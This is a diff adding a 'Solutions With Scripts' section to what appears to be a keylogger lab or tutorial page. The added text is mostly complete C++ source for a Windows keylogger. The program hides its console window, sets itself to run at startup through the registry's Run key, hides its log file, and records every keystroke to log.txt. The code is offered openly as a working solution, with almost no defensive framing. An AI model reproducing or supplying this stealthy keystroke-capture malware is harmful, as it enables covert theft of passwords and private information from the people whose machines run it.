@@ -31,4 +31,63 @@ A keylogger is a type of malware used in cyberattacks to steal sensitive informa
 
 
 ## Solutions With Scripts
-1. 
+1. Save the following C++ program and compile it
+   ```
+    #include <iostream>
+    #include <windows.h>
+    
+    using namespace std;
+    
+    int Save(int _key, char *file);
+    
+    void AddToStartup() {
+        char filePath[MAX_PATH];
+        GetModuleFileName(NULL, filePath, MAX_PATH);
+        HKEY hKey;
+        RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
+        RegSetValueEx(hKey, "MyKeylogger", 0, REG_SZ, (BYTE*)filePath, strlen(filePath) + 1);
+        RegCloseKey(hKey);
+    }
+    
+    void HideLogFile() {
+        SetFileAttributes("log.txt", FILE_ATTRIBUTE_HIDDEN);
+    }
+    
+    int main() {
+        FreeConsole();
+        AddToStartup();
+        HideLogFile();
+    
+        char i;
+        while (true) {
+            Sleep(10);
+            for (i = 8; i <= 255; i++) {
+                if (GetAsyncKeyState(i) == -32767) {
+                    Save(i, "log.txt");
+                }
+            }
+        }
+        return 0;
+    }
+    
+    int Save(int _key, char *file) {
+        FILE *OUTPUT_FILE;
+        OUTPUT_FILE = fopen(file, "a+");
+        switch (_key) {
+            case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]"); break;
+            case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]"); break;
+            case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LBUTTON]"); break;
+            case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]"); break;
+            case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]"); break;
+            case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]"); break;
+            case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]"); break;
+            case VK_CONTROL: fprintf(OUTPUT_FILE, "[CTRL]"); break;
+            case VK_MENU: fprintf(OUTPUT_FILE, "[ALT]"); break;
+            case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS LOCK]"); break;
+            case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]"); break;
+        }
+        fprintf(OUTPUT_FILE, "%s", &_key);
+        fclose(OUTPUT_FILE);
+        return 0;
+    }
+   ```
